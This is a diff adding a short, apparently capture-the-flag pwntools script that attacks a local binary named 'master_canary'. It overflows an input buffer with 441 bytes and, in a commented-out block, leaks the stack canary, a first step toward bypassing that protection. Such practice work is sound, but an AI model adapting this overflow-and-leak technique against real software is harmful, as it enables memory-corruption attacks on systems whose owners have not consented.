@@ -1,0 +1,14 @@
+from pwn import *
+p = process("./master_canary")
+elf = ELF("./master_canary")
+p.sendline("1")
+sleep(0.1)
+p.sendline("2")
+p.sendlineafter("Data: ", "a" * 441)
+'''
+p.recvuntil("Data: ")
+
+canary = u64(p.recv(8)) - 0x61
+p.success("canary : " + hex(canary))
+'''
+p.interactive()
